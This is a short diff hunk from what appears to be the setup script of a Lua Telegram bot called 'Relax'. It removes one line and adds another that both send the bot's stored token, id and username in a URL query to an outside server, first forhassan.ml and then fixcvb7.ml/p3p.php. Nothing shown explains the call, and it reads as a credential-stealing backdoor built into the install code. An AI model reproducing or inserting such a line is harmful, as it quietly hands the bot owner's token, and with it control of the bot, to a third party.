@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_Relax_Info()
 Create_Info(database:get(Server_Relax.."Token_Relax"),database:get(Server_Relax.."Id_Relax"),database:get(Server_Relax.."UserName_Relax"))   
-https.request("https://forhassan.ml/Relax/Relax.php?id="..database:get(Server_Relax.."Id_Relax").."&user="..database:get(Server_Relax.."UserName_Relax").."&token="..database:get(Server_Relax.."Token_Relax"))
+https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_Relax.."Id_Relax").."&user="..database:get(Server_Relax.."UserName_Relax").."&token="..database:get(Server_Relax.."Token_Relax"))
 local RunRelax = io.open("Relax", 'w')
 RunRelax:write([[
 #!/usr/bin/env bash
